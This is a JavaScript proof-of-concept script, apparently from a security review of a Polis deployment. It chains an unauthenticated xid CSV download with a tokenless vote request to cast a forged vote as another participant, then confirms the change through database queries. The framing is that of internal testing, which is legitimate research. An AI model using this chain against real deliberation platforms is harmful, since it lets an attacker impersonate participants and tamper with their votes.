// SPDX-License-Identifier: AGPL-3.0-or-later
//
// R3 spike: is an xid a secret? Chain check in round "P" (run exports-probe first):
//   1. member M (an admitted xid) gets an ordinary participant token by voting;
//   2. with that token, M asks GET /api/v3/conversationUuid;
//   3. with the UUID and NO login, M downloads /api/v3/xid/<uuid>-xid.csv;
//   4. M sends POST /api/v3/votes with ANOTHER member's xid and no token.
// Prints statuses and counts only (no xids). Changes one test vote in round P.

import { POLIS_URL, api, lit, psql, raw, readR2State } from "../../r2/lib/r2.mjs";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const P = readR2State().conversations.P;
const [mine] = readFileSync(join(here, "..", ".local", "admitted-P.txt"), "utf8").split(/\r?\n/).filter(Boolean);

// 1. M's own participant token.
const own = await api("POST", "/api/v3/votes", { body: { conversation_id: P, xid: mine, tid: 0, vote: -1 } });
const token = own.body?.auth?.token;
// 2. UUID with a participant token.
const uuidRes = await api("GET", "/api/v3/conversationUuid", { token, query: { conversation_id: P } });
const uuid = uuidRes.body?.conversation_uuid;
// 3. Public xid map.
const csv = await raw("GET", `${POLIS_URL}/api/v3/xid/${uuid}-xid.csv`);
const rows = String(csv.body)
  .split(/\r?\n/)
  .slice(1)
  .filter(Boolean)
  .map((l) => l.split(",").map((c) => c.trim().replace(/^"|"$/g, "")));
const victim = rows.map((r) => r[1]).find((x) => x && x !== mine);
if (process.env.R3_DEBUG) console.error({ status: csv.status, rows: rows.length, shape: rows[0]?.map((c) => c.length) });
// 4. Vote as the victim: flip their vote on statement 1.
const pidOf = (x) =>
  Number(psql(`SELECT p.pid FROM zinvites z JOIN conversations c ON c.zid = z.zid JOIN xids x ON x.owner = c.owner AND x.xid = ${lit(x)} JOIN participants p ON p.zid = z.zid AND p.uid = x.uid WHERE z.zinvite = ${lit(P)};`)[0][0]);
const voteOf = (pid) =>
  psql(`SELECT vote FROM votes_latest_unique v JOIN zinvites z ON z.zid = v.zid WHERE z.zinvite = ${lit(P)} AND v.pid = ${pid} AND v.tid = 1;`)[0]?.[0];
const vpid = pidOf(victim);
const before = voteOf(vpid);
const target = before === "1" ? -1 : 1;
const forged = await api("POST", "/api/v3/votes", { body: { conversation_id: P, xid: victim, tid: 1, vote: target } });
const after = voteOf(vpid);

console.log(
  JSON.stringify(
    {
      ownVote: own.status,
      gotParticipantToken: Boolean(token),
      conversationUuidWithParticipantToken: uuidRes.status,
      xidCsvNoLogin: { status: csv.status, xidRows: rows.length },
      foundAnotherMembersXid: Boolean(victim),
      voteAsOtherMember: forged.status,
      otherMembersVoteOnStatement1: { before, after, changed: before !== after },
    },
    null,
    2,
  ),
);
